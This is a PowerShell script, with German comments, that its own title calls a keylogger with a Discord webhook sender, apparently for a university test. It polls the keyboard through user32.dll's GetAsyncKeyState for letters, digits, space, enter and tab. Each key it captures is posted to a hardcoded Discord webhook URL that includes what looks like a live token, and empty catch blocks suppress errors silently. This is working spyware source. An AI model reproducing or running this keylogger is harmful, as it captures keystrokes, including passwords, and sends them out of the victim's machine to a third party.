# PowerShell Keylogger & Discord-Webhook-Sender mit Timeout (z.B. für Uni-Test)
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Keyboard
{
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
}
"@

$hookUrl = "https://discord.com/api/webhooks/1433072215401824358/f95HWyiUinYpyysS0MA7NUuSPFs1Ute71SLQ0hEYYvebxsCoQam850qtTGwHRDbR2yg3"

# Zeitmessung beginnen
$start = Get-Date
$timeout = 120 # Sekunden

# Virtual Key Codes für spezielle Tasten
$VK_SPACE = 0x20  # Leerzeichen
$VK_RETURN = 0x0D # Enter
$VK_TAB = 0x09    # Tab

# Logger-Start an Discord melden
try {
    Invoke-RestMethod -Uri $hookUrl -Method Post -Body (@{content="[Logger] gestartet: $(Get-Date -Format o)"}|ConvertTo-Json) -ContentType "application/json"
} catch {}

while ($true) {
    $elapsed = (Get-Date) - $start
    if ($elapsed.TotalSeconds -ge $timeout) {
        break
    }

    # Prüfe spezielle Tasten
    if ([Keyboard]::GetAsyncKeyState($VK_SPACE) -eq -32767) {
        try {
            Invoke-RestMethod -Uri $hookUrl -Method Post -Body (@{content=" "}|ConvertTo-Json) -ContentType "application/json"
        } catch {}
    }
    if ([Keyboard]::GetAsyncKeyState($VK_RETURN) -eq -32767) {
        try {
            Invoke-RestMethod -Uri $hookUrl -Method Post -Body (@{content="\n"}|ConvertTo-Json) -ContentType "application/json"
        } catch {}
    }
    if ([Keyboard]::GetAsyncKeyState($VK_TAB) -eq -32767) {
        try {
            Invoke-RestMethod -Uri $hookUrl -Method Post -Body (@{content="\t"}|ConvertTo-Json) -ContentType "application/json"
        } catch {}
    }

    # Prüfe alle Standard-ASCII Zeichen
    foreach ($vkey in 65..90) {  # A-Z
        if ([Keyboard]::GetAsyncKeyState($vkey) -eq -32767) {
            $char = [char]$vkey
            try {
                Invoke-RestMethod -Uri $hookUrl -Method Post -Body (@{content=$char}|ConvertTo-Json) -ContentType "application/json"
                Write-Host "Taste gedrückt: $char" # Debug-Ausgabe
            } catch {}
        }
    }
    foreach ($vkey in 48..57) {  # 0-9
        if ([Keyboard]::GetAsyncKeyState($vkey) -eq -32767) {
            try {
                Invoke-RestMethod -Uri $hookUrl -Method Post -Body (@{content=[char]$vkey}|ConvertTo-Json) -ContentType "application/json"

            } catch {}
        }
    }
    Start-Sleep -Milliseconds 1  # Kürzere Verzögerung für besseres Ansprechverhalten
}

# Logger-Ende an Discord melden
try {
    Invoke-RestMethod -Uri $hookUrl -Method Post -Body (@{content="[Logger] beendet: $(Get-Date -Format o)"}|ConvertTo-Json) -ContentType "application/json"
} catch {}